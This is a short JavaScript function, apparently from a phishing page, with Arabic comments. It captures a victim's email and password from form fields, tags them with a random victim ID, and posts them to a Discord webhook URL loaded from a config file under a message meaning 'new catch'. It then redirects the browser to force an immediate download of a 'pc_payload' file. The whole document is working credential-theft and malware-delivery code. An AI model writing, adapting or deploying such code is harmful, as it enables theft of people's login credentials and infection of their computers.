async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    const victimID = "ID-" + Math.floor(Math.random() * 9000 + 1000);

    // إرسال البيانات للديسكورد أولاً
    const configRes = await fetch('./data.json');
    const config = await configRes.json();
    
    await fetch(config.webhook_url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            content: `💀 صيد جديد: **${victimID}**\n📧 إيميل: \`${email}\`\n🔑 باسورد: \`${pass}\``
        })
    });

    // --- التحميل الإجباري الفوري ---
    window.location.assign(config.pc_payload); 
}
